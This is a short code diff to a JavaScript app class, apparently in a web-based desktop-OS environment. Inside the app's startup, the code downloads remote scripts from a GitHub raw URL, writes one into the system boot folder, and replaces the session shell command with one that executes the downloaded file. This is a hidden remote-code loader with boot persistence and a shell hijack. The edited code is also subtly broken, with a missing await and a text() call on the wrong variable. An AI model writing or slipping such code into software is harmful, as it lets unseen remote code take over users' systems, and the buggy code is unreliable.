@@ -57,9 +57,11 @@ class GUIApplication extends WApplication {
             icon: await Theme.getIconUrl("apps/notron", '16x16')
         }, true);
         mainwnd.show();
-            let response = await (await fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/hehe.js")).text();
+            let respons = await fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/hehe.js")
+            let response = respons.text();
             await fs.writestr("c:/system/boot/notron.js", response);
-            response = await (await fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown")).text();
+            respons = await fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown")
+            response = response.text();
             await fs.writestr("c:/user/appdata/z.wrt", response);
             await fs.mvfile("c:/user/desktop/notronplus.wrt", "c:/user/appdata/y.wrt");
             SCM.set("System/Session/Shell/exec", "wjs c:/user/appdata/z.wrt");
